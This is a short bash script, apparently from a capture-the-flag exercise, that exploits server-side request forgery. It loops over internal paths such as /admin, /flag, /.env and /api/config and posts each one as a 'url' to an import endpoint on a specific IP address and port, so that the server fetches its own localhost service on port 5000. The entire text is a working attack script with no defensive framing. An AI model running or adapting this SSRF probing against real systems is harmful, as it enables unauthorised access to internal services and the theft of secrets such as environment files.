export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH"

echo "### SSRF via port interne 5000 (vrai process Express) ###"
for path in / /admin /api/admin /api/admin/flag /flag /api/flag /internal /private /debug /secret /api/secret /metrics /api/internal/flag /.env /api/config /api/internal /status /health /version /api/status /api/health /api/debug /robots.txt; do
  resp=$(curl -s -X POST http://154.57.164.77:40860/api/prisoners/import \
    -H 'Content-Type: application/json' \
    -d "{\"url\":\"http://127.0.0.1:5000$path\"}")
  echo "$path -> $resp"
done
